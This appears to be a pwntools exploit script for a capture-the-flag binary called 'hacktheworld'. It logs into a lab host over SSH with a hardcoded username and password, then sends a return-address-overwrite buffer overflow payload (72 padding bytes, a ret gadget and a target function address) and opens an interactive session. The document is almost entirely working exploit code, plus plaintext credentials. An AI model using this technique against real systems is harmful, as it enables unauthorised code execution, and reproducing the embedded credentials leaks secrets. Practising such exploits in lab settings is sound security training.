from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

conn = ssh(host="10.10.101.210", user="magna", password="magnaisanelephant")
offset = b'A'*72

ret = p64(0x4005d9)
func = p64(0x0000000000400657)

print(str(func))
exe = "./hacktheworld"
elf = context.binary = ELF(exe, checksec=False)
io = conn.process("./hacktheworld")
payload = offset + ret + func
f = open("payload.txt","w")
f.write(str(payload))
f.close()
#io.recvuntil('? ')
io.sendline(payload)#
io.interactive()
